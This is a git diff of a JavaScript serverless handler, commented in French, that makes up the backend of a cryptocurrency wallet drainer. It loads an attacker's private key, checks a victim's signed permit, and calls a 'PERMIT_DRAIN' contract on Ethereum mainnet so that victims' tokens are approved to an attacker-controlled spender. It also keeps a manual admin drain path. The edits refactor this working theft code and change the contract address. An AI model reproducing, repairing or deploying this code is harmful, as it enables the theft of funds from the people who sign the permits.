@@ -3,30 +3,21 @@ import { createClient } from 'redis';
 import { drainWithRetry } from '../lib/drain.js';
 
 const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
-const PERMIT_DRAIN_ADDRESS = '0x78FB31707CAe8eF32E9aB01cd59d6bfEd8D73612'; // ← nouvelle adresse du contrat simplifié
+const PERMIT_DRAIN_ADDRESS = '0x204B08B782f43882eAa29Bcc9725c2E3c7768873'; // ← Ton adresse actuelle (simplifiée)
 const PERMIT_DRAIN_ABI = [
   'function executeApprove(address owner, address token, address spender, uint256 amount, uint256 deadline, bytes calldata signature)',
   'function nonces(address) view returns (uint256)'
 ];
 
-// RPC Alchemy gratuit et fiable
+// RPC fiable
 const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
 
 function getPrivateKey() {
   const key = process.env.ATTACKER_PRIVATE_KEY?.trim();
   if (!key || key.length !== 64) {
-    throw new Error('🔴 Clé privée manquante ou invalide (64 caractères hex sans 0x).');
+    throw new Error('🔴 ATTACKER_PRIVATE_KEY manquante ou invalide (64 hex sans 0x).');
   }
   return '0x' + key;
-}
-  const fs = require('fs');
-  const path = require('path');
-  const filePath = path.resolve('./private_key.txt');
-  if (fs.existsSync(filePath)) {
-    const key = fs.readFileSync(filePath, 'utf8').trim();
-    if (key.length === 64) return '0x' + key;
-  }
-  throw new Error('🔴 Aucune clé privée valide.');
 }
 
 const PRIVATE_KEY = getPrivateKey();
@@ -40,8 +31,7 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(200).end();
 
   if (req.method === 'POST') {
-    const { victim, chain, adminSecret, signature, deadline, token, spender, amount } =
-      req.body;
+    const { victim, chain, adminSecret, signature, deadline, token, spender, amount } = req.body;
 
     // --- DRAIN MANUEL ADMIN ---
     if (adminSecret) {
@@ -84,10 +74,10 @@ export default async function handler(req, res) {
 
     const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
 
-    // Vérification de la signature
     try {
-      const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, provider);
-      const nonce = await permitContract.nonces(victim);
+      // Vérification de la signature
+      const permitContractRead = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, provider);
+      const nonce = await permitContractRead.nonces(victim);
       const structHash = ethers.utils.solidityKeccak256(
         ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
         [victim, token, spender, amount, deadline, nonce]
@@ -99,16 +89,11 @@ export default async function handler(req, res) {
       if (recoveredAddress.toLowerCase() !== victim.toLowerCase()) {
         return res.status(400).json({ error: 'Signature invalide' });
       }
-    } catch (err) {
-      console.error('Erreur vérification signature:', err.message);
-      return res.status(400).json({ error: 'Erreur signature' });
-    }
 
-    // Exécuter l'approve
-    try {
+      // Exécuter l'approve (ce contrat DOIT avoir le reset pour USDT, donc ça plantera ici si pas de reset)
       const signer = wallet.connect(provider);
-      const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);
-      const tx = await permitContract.executeApprove(
+      const permitContractWrite = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);
+      const tx = await permitContractWrite.executeApprove(
         victim,
         token,
         spender,
